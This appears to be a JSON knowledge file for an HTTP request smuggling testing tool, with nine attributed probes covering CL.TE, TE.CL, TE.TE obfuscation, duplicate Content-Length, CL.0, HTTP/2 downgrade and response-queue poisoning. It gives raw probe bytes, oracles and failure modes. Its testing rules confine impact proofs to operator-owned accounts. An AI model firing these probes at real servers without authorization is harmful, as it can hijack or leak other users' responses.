@@ -1,0 +1,179 @@
+{
+  "corpus": "DS",
+  "organ": "desync-hunter",
+  "vuln_class": "http_request_smuggling",
+  "corpus_version": "1.0.0",
+  "house_rules": [
+    "Probe bytes below are transcribed from the public record and attributed per entry - this corpus never invents bytes.",
+    "Line breaks inside probe bodies are CRLF. If you alter a single byte, recompute the chunk sizes and Content-Length values yourself.",
+    "Timing is a LEAD, never a CONFIRMED (organ rule 4): every timeout oracle must graduate to a response-class differential.",
+    "failure_modes are mandatory reading BEFORE closing a hypothesis as negative: a probe that failed for a listed reason leaves the seam untested, not disproven."
+  ],
+  "entries": [
+    {
+      "id": "DS-001",
+      "technique": "CL.TE differential-response probe (non-blind)",
+      "prerequisites": [
+        "front-end honors Content-Length, back-end honors Transfer-Encoding: chunked",
+        "connection reuse between the two parsers"
+      ],
+      "probe": "POST /search HTTP/1.1\r\nHost: {{host}}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\ne\r\nq=smuggling&x=\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x",
+      "oracle": "the smuggled 'GET /404' becomes the response to the NEXT request on the connection: the following normal request returns 404 (or the front-end's error for the malformed prefix) instead of its real body",
+      "failure_modes": [
+        "the front-end normalizes or strips TE when both headers present - both parsers then agree (probe harmless, seam absent)",
+        "per-request connections (no keep-alive reuse between the disagreeing pair) - nothing is smuggled",
+        "response queue isolation / routing: the poisoned victim lands on a different back-end pool than your follow-up",
+        "a cache layer between you and the seam serves the follow-up from cache - the differential never reaches you",
+        "WAF drops CL+TE combinations outright - refusal, not a negative"
+      ],
+      "source": {
+        "credit": "PortSwigger Web Security Academy",
+        "title": "HTTP request smuggling - Finding and confirming CL.TE vulnerabilities",
+        "url": "https://portswigger.net/web-security/request-smuggling/finding"
+      }
+    },
+    {
+      "id": "DS-002",
+      "technique": "CL.TE timeout probe (blind lead)",
+      "prerequisites": ["same seam as DS-001", "observable wall-clock on the request"],
+      "probe": "POST / HTTP/1.1\r\nHost: {{host}}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX",
+      "oracle": "front-end forwards only the first 4 body bytes ('1\\r\\nA'); the back-end chunked parser waits for the rest of the chunk and stalls the connection - request hangs until timeout",
+      "failure_modes": [
+        "front-end idle/read timeout shorter than your measurement window resets before you notice",
+        "any intermediary fully buffers and re-frames the request - no stall reaches the back-end",
+        "timeout alone NEVER confirms (organ rule 4) - graduate to DS-001 or park as LEAD"
+      ],
+      "source": {
+        "credit": "PortSwigger Web Security Academy",
+        "title": "HTTP request smuggling - timeout probes",
+        "url": "https://portswigger.net/web-security/request-smuggling/finding"
+      }
+    },
+    {
+      "id": "DS-003",
+      "technique": "TE.CL differential-response probe (non-blind)",
+      "prerequisites": [
+        "front-end honors Transfer-Encoding: chunked, back-end honors Content-Length",
+        "connection reuse between the two parsers"
+      ],
+      "probe": "POST /search HTTP/1.1\r\nHost: {{host}}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n7b\r\nGET /404 HTTP/1.1\r\nHost: {{host}}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 144\r\nx=\r\n0\r\n\r\n",
+      "oracle": "the front-end ends the request at the '0' chunk; the back-end, honoring the smuggled request's own Content-Length: 144, absorbs the next real request as body - the victim's response IS the smuggled GET /404 response",
+      "failure_modes": [
+        "the smuggled CL: 144 must span at least one full victim request - short victims (GET with no body) may not be fully absorbed; tune per victim",
+        "front-end rewrites headers on forwarding (adds X-Forwarded-For etc.) - byte counts shift, recompute",
+        "the back-end rejects the prefixed victim as malformed and closes - differential is a reset, ambiguous without the response-class pair"
+      ],
+      "source": {
+        "credit": "PortSwigger Web Security Academy",
+        "title": "HTTP request smuggling - confirming TE.CL vulnerabilities",
+        "url": "https://portswigger.net/web-security/request-smuggling/finding"
+      }
+    },
+    {
+      "id": "DS-004",
+      "technique": "TE.CL timeout probe (blind lead)",
+      "prerequisites": ["same seam as DS-003"],
+      "probe": "POST / HTTP/1.1\r\nHost: {{host}}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\nX",
+      "oracle": "front-end (TE) ends the request at the zero chunk; back-end (CL: 6) has only 4 body bytes and blocks waiting for the remaining 2 - connection hangs",
+      "failure_modes": [
+        "same buffering/timeout caveats as DS-002",
+        "the back-end instead treats the prefix as a new request and answers 400 - that is a response-class signal, not a failure: record it and move to DS-003"
+      ],
+      "source": {
+        "credit": "PortSwigger Web Security Academy",
+        "title": "HTTP request smuggling - timeout probes",
+        "url": "https://portswigger.net/web-security/request-smuggling/finding"
+      }
+    },
+    {
+      "id": "DS-005",
+      "technique": "TE.TE obfuscation set (disagreement induction)",
+      "prerequisites": ["both parsers claim to honor Transfer-Encoding", "at least one lenient TE parser in the chain"],
+      "probe": "Transfer-Encoding: xchunked\r\n-- or --\r\nTransfer-Encoding:\r\n chunked\r\n-- or --\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n-- or --\r\nTransfer-Encoding:[tab]chunked",
+      "oracle": "one parser treats the obfuscated header as absent (falls back to Content-Length), the other still parses chunked - converts a TE.TE agreement into a CL.TE or TE.CL seam; confirm with DS-001/DS-003 afterward",
+      "failure_modes": [
+        "strict parsers reject the whole request (400/refusal) - refusal is not a negative",
+        "both parsers agree the obfuscation is invalid in the SAME direction - no seam, but re-test the other variants before closing",
+        "WAF/normalizing proxy rewrites the header before either parser sees it"
+      ],
+      "source": {
+        "credit": "James Kettle / PortSwigger Research",
+        "title": "HTTP Desync Attacks: Request Smuggling in the HTTP/1.1 Era (TE.TE obfuscation appendix)",
+        "url": "https://portswigger.net/research/http-desync-attacks"
+      }
+    },
+    {
+      "id": "DS-006",
+      "technique": "duplicate Content-Length seam",
+      "prerequisites": ["a parser in the chain that accepts two Content-Length headers"],
+      "probe": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 5\r\nContent-Length: 6\r\n\r\nA=1&B=",
+      "oracle": "two parsers pick different CL values (or different rejection postures) - the byte after the smaller CL becomes the next request's prefix; detect via the DS-001 response-class pattern",
+      "failure_modes": [
+        "RFC-strict stacks reject duplicate CL outright (refusal, not a negative)",
+        "both parsers take the first (or last) value identically - record agreement as a FACT and move on"
+      ],
+      "source": {
+        "credit": "James Kettle / PortSwigger Research",
+        "title": "HTTP Desync Attacks (duplicate-CL class)",
+        "url": "https://portswigger.net/research/http-desync-attacks"
+      }
+    },
+    {
+      "id": "DS-007",
+      "technique": "CL.0 browser-powered desync probe",
+      "prerequisites": [
+        "a browser-reachable page on the origin whose responses leave the socket in a state where a POST body is not drained",
+        "operator-owned browser session for the victim side"
+      ],
+      "probe": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {{host}}\r\nFoo: bar",
+      "oracle": "the server processes the request as CL:0 (no body) but leaves the trailing bytes in the socket buffer; the browser's next request on that connection is prefixed by the smuggled request - the RESPONSE you receive corresponds to the smuggled request, not the browser's",
+      "failure_modes": [
+        "the server drains the declared body or closes per-request sockets - no residual bytes",
+        "browser connection coalesling/priming heuristics route the follow-up elsewhere",
+        "any intermediary re-frames - classic caveat, applies to every entry here"
+      ],
+      "source": {
+        "credit": "James Kettle / PortSwigger Research",
+        "title": "Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling",
+        "url": "https://portswigger.net/research/browser-powered-desync-attacks"
+      }
+    },
+    {
+      "id": "DS-008",
+      "technique": "H2.CL / H2.TE downgrading seam",
+      "prerequisites": [
+        "HTTP/2 front-end that downgrades to HTTP/1.1 toward the back-end",
+        "ability to send arbitrary HTTP/2 headers (including content-length and transfer-encoding as regular headers)"
+      ],
+      "probe": ":method POST\r\n:path /\r\ncontent-length: 6\r\n\r\n<DATA frames carrying more than 6 bytes ending in a complete smuggled request>",
+      "oracle": "the downgrade translates the declared content-length into HTTP/1.1 CL while extra DATA-frame bytes become the next request's prefix - confirm via the response-class differential on a subsequent request",
+      "failure_modes": [
+        "the front-end enforces its own framing strictly and rejects mismatched content-length (refusal)",
+        "back-end is HTTP/2 native (no downgrade hop) - the seam does not exist on this chain",
+        "h2c-only internals never downgrade - map the chain first (organ procedure step 1)"
+      ],
+      "source": {
+        "credit": "James Kettle / PortSwigger Research",
+        "title": "HTTP/2: The Sequel Is Always Worse (H2.CL / H2.TE)",
+        "url": "https://portswigger.net/research/http2-request-smuggling"
+      }
+    },
+    {
+      "id": "DS-009",
+      "technique": "Response-queue poisoning (impact proof, bounded)",
+      "prerequisites": ["a confirmed seam (DS-001/DS-003)", "smuggled request that deliberately receives no response of its own"],
+      "probe": "<smuggled request that elicits no response, e.g. an incomplete GET with no terminating blank line>",
+      "oracle": "the back-end's response queue desynchronizes by one: every subsequent user's response is shifted - the victim (operator-owned session) receives the previous user's response; bounded proof = ONE shifted response to an operator-owned victim, then stop",
+      "failure_modes": [
+        "response routing is per-connection, not a shared queue - no shift observable",
+        "queue shift requires the smuggled request to genuinely hang server-side - test on operator accounts only (organ rule 1)",
+        "impact beyond the operator account is a report line, never an action"
+      ],
+      "source": {
+        "credit": "James Kettle / PortSwigger Research",
+        "title": "HTTP Desync Attacks (response queue poisoning)",
+        "url": "https://portswigger.net/research/http-desync-attacks"
+      }
+    }
+  ]
+}
